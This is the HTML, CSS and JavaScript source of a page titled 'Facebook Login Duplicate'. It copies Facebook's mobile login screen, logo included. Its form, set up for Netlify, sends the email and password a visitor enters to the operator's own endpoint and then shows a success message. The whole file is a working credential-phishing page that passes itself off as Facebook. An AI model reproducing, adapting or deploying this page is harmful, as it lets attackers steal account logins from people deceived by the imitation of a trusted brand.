<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook Login Duplicate</title>
    <!-- Add Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            color: #1c1e21;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 500px;
            min-width: 320px;
            padding: 1rem;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            margin-top: -10px;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 4rem;
        }
        .back-arrow {
            position: absolute;
            left: 0;
            font-size: 2.2rem;
            color: #1c1e21;
            cursor: pointer;
        }
        .language-selector {
            font-size: 0.875rem;
            color: #65676b;
            position: relative;
            text-align: center;
            border: none;
            background: transparent;
            appearance: none;
            outline: none;
            cursor: pointer;
            margin-top: 3rem;
        }
        .language-selector::after {
            content: 'â–¼';
            position: absolute;
            right: -1.25rem;
            top: 0;
            color: #65676b;
            font-size: 0.75rem;
        }
        .logo {
            display: block;
            margin: 0 auto 5rem;
            width: 3rem;
            height: 3rem;
            border-radius: 50%;
            overflow: hidden;
        }
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .form-group {
            position: relative;
            margin-bottom: 1rem;
            width: 100%;
            display: flex;
            justify-content: center;
            overflow: visible;
        }
        .input-field {
            width: 100%;
            max-width: 550px;
            padding: 1rem 2.5rem 1rem 1rem;
            background-color: #fff;
            border: 1px solid #ccd0d5;
            border-radius: 6px;
            color: #1c1e21;
            font-size: 1rem;
            box-sizing: border-box;
            height: 3rem;
            transition: height 0.2s ease, border-color 0.2s ease;
            margin: 0 auto;
        }
        .input-field:focus,
        .input-field:not(:placeholder-shown) {
            height: 4rem;
            border-color: #000000;
            outline: none;
        }
        .input-field:blur:not(:placeholder-shown) {
            height: 3rem;
        }
        .input-field::placeholder {
            color: #8f949c;
            opacity: 0;
        }
        .floating-label {
            position: absolute;
            left: 1rem;
            top: 0.5rem;
            color: #8f949c;
            font-size: 1rem;
            pointer-events: none;
            z-index: 1;
            opacity: 1;
            transition: top 0.2s ease;
        }
        .input-field:focus ~ .floating-label,
        .input-field:not(:placeholder-shown) ~ .floating-label {
            top: 0.25rem;
        }
        .info-icon {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            width: 1rem;
            height: 1rem;
            background-color: #e4e6ea;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.625rem;
            color: #65676b;
            cursor: pointer;
            z-index: 1;
        }
        .password-icon {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 1.25rem;
            color: #808080;
            display: none;
        }
        .password-group .input-field:not(:placeholder-shown) ~ .password-icon {
            display: block;
        }
        .login-button {
            width: 100%;
            padding: 0.75rem;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 30px;
            font-size: 1.125rem;
            font-weight: bold;
            cursor: pointer;
            margin: 0 auto 1rem;
        }
        .forgot-password {
            text-align: center;
            color: black;
            font-size: 0.875rem;
            text-decoration: none;
            display: block;
            margin-bottom: 8rem;
        }
        .create-account {
            width: 100%;
            padding: 0.75rem;
            background: #fff;
            color: #1877f2;
            border: 1px solid #1877f2;
            border-radius: 20px;
            font-size: 1rem;
            cursor: pointer;
            margin: 0 auto 1rem;
        }
        .example-link {
            text-align: center;
            margin-top: 0rem;
        }
        .example-link img {
            max-width: 4.5rem;
            height: auto;
        }
        .password-group .input-field {
            padding: 1rem 2.5rem 1rem 1rem;
        }
        .form-message {
            text-align: center;
            margin: 1rem 0;
            font-size: 1rem;
            display: none;
        }
        .form-message.success {
            color: #28a745;
            display: block;
        }
        .form-message.error {
            color: #dc3545;
            display: block;
        }

        /* Media Queries for Desktop */
        @media (min-width: 768px) {
            .container {
                max-width: 600px;
                padding: 2rem;
                margin-top: 0;
            }
            .header {
                margin-bottom: 5rem;
            }
            .back-arrow {
                font-size: 2rem;
            }
            .language-selector {
                font-size: 1rem;
                margin-top: 4rem;
            }
            .language-selector::after {
                font-size: 0.875rem;
            }
            .logo {
                width: 4rem;
                height: 4rem;
                margin-bottom: 6rem;
            }
            .input-field {
                width: 100%;
                max-width: 660px;
                font-size: 1.125rem;
                height: 3.5rem;
            }
            .input-field:focus,
            .input-field:not(:placeholder-shown) {
                height: 4.5rem;
            }
            .input-field:blur:not(:placeholder-shown) {
                height: 3.5rem;
            }
            .floating-label {
                font-size: 1.125rem;
                left: 1rem;
            }
            .info-icon,
            .password-icon {
                right: 0.75rem;
            }
            .login-button {
                font-size: 1.25rem;
                padding: 1rem;
            }
            .create-account {
                font-size: 1.125rem;
                padding: 1rem;
            }
            .forgot-password {
                font-size: 1rem;
                margin-bottom: 10rem;
            }
            .example-link img {
                max-width: 5rem;
            }
        }

        /* Prevent overflow on very small screens */
        @media (max-width: 360px) {
            .input-field {
                width: 100%;
                max-width: none;
            }
            .floating-label {
                left: 1rem;
            }
            .info-icon,
            .password-icon {
                right: 0.75rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="back-arrow">&#8592;</span>
            <select class="language-selector">
                <option value="en-us">English (US)</option>
                <option value="es">Spanish</option>
                <option value="ar">Arabic</option>
                <option value="fr">French</option>
            </select>
        </div>
        <a href="#" class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
        </a>
        <form name="login" netlify data-netlify="true" action="#">
            <input type="hidden" name="form-name" value="login" />
            <div class="form-group">
                <input type="text" class="input-field" id="email-input" name="email" placeholder=" " autocomplete="email" required>
                <label for="email-input" class="floating-label">Mobile number or email</label>
                <span class="info-icon" aria-label="Information">i</span>
            </div>
            <div class="form-group password-group">
                <input type="password" class="input-field" id="password-input" name="password" placeholder=" " autocomplete="current-password" required>
                <label for="password-input" class="floating-label">Password</label>
                <i class="password-icon fa-solid fa-eye" onclick="togglePasswordVisibility('password-input', this)"></i>
            </div>
            <div id="form-message" class="form-message"></div>
            <button type="submit" class="login-button">Log in</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
        <button class="create-account">Create new account</button>
        <div class="example-link">
            <img src="https://raw.githubusercontent.com/hopmos/webimage/main/Metalogo.png" alt="Custom Logo">
        </div>
    </div>
    <script>
        function togglePasswordVisibility(inputId, icon) {
            const input = document.getElementById(inputId);
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('focus', function() {
                if (this.value === '') {
                    this.style.height = window.innerWidth >= 768 ? '4.5rem' : '4rem';
                }
            });
            input.addEventListener('blur', function() {
                if (this.value === '') {
                    this.style.height = window.innerWidth >= 768 ? '3.5rem' : '3rem';
                }
            });
        });

        // Handle form submission with AJAX
        document.querySelector('form[name="login"]').addEventListener('submit', async (e) => {
            e.preventDefault();
            const form = e.target;
            const formData = new FormData(form);
            const messageDiv = document.getElementById('form-message');

            // Clear previous messages
            messageDiv.textContent = '';
            messageDiv.classList.remove('success', 'error');

            try {
                const response = await fetch('/', {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    messageDiv.textContent = 'Form submitted successfully!';
                    messageDiv.classList.add('success');
                    form.reset();
                } else {
                    messageDiv.textContent = 'Error submitting form. Please try again.';
                    messageDiv.classList.add('error');
                }
            } catch (error) {
                console.error('Submission error:', error);
                messageDiv.textContent = 'An error occurred. Please try again.';
                messageDiv.classList.add('error');
            }
        });
    </script>
</body>
</html>
